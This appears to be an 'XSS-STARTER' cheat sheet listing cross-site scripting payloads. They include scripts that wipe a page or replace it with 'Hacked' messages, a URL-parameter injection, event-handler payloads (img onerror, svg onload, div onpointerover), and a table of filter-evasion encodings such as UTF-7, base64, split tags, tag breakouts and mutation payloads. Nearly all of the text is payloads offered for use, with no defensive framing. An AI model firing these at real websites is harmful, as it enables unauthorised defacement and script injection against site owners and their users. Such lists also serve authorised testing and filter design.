### XSS-STARTER

Change Background Color
```
<body style="background-color:blue;">
```

Change Background Image
```
<style>div {background-image: url('http://www.deepeddy.net/img/deepeddyfish.gif');}</style>
```

Wipeout All HTML Tags
```
<script>document.documentElement.innerHTML=""</script>
```

Change Background Image + Customize
```
<script>document.documentElement.innerHTML="<html><h1>Hacked</h1>How's your security?</html>"</script>
```

Change Background Image + Customize
```
<script>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED</h1></div>";</script>
```

Change Background Image + Customize
```
<script>document.body.innerHTML="<h1>Hacked</h1>";</script>
```

Inject in URL Using Parameter
```
http://12345.com/blabla/?name=<script>document.documentElement.innerHTML="<html><h1>Hacked</h1>How's your security?</html>"</script>
```

Encode Using Charcode
```
<script>document.documentElement.innerHTML=(String.fromCharCode(CharCode string goes here));</script>
```

Basic Payload for Test
```
<script>alert(1)</script>
```

Div Payload
```
<div onpointerover='alert(1)'>MOVE HERE</div
```

IMG Payload
```
<img src=x onerror=alert('1');>
```

Body Payload
```
<body ontouchstart=alert(1)>
```

SVG Payload
```
<svg onload=alert('1')>
```


## Type of Encoding

| Type                  | Example                          |
|-----------------------|----------------------------------|
| UPPER CASE            | <SCRIPT>ALERT(1)</SCRIPT>      |
| UPPER AND LOWER CASE  | <ScRiPt>aleRt(1)</ScRiPt>      |
| URL ENCODE  |  %3Cscript%3Ealert%281%29%3C%2Fscript%3E  |
|  HTML ENTITY ENCODE  |  &lt;script&gt;alert(1)&lt;/script&gt;  |
|  SPLIT PAYLOAD |  <scri</script>pt>>alert(1)</scri</script>pt>>  |
|  HEX ENCODE  |  3c7363726970743e616c6572742831293c2f7363726970743e  |
|  UTF-16 ENCODE  |  Encode payload to utf-16 format.  |
|  UTF-32 ENCODE  |  Encode payload to utf-32 format.  |
|  DELETE TAG  |  ";alert('XSS');//  |
|  UNICODE ENCODE  |  %uff1cscript%uff1ealert(1)%uff1c/script%uff1e  |
|  US-ASCII ENCODE  |  ¼script¾alert(1)¼/script¾  |
|  BASE64 ENCODE  |  PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==  |
|  UTF-7 ENCODE  |  +ADw-script+AD4-alert(1)+ADw-/script+AD4-  |
|  PARENTHESIS BYPASS  |  <script>alert`1`</script>  |
|  UTF-8 ENCODE  |  %C0%BCscript%C0%BEalert%CA%B91)%C0%BC/script%C0%BE  |
|  TAG BLOCK BREAKOUT  |  "><script>alert(1)</script>  |
|  SCRIPT BREAKOUT  |  </script><script>alert(1)</script>  |
|  FILE UPLOAD PAYLOAD  |  "><script>alert(1)</script>.gif  |
|  INSIDE COMMENTS BYPASS  |  <!--><script>alert(1)</script>-->  |
|  MUTATION PAYLOAD  |  <noscript><p title="</noscript><script>alert(1)</script>">  |
|  MALFORMED IMG  |  <IMG """><script>alert(1)</script>">  |
|  SPACE BYPASS  |  <img^Lsrc=x^Lonerror=alert('1');>  |
|  DOWNLEVEL-HIDDEN BLOCK  |  <!--[if gte IE 4]><script>alert(1)</script><![endif]-->  |
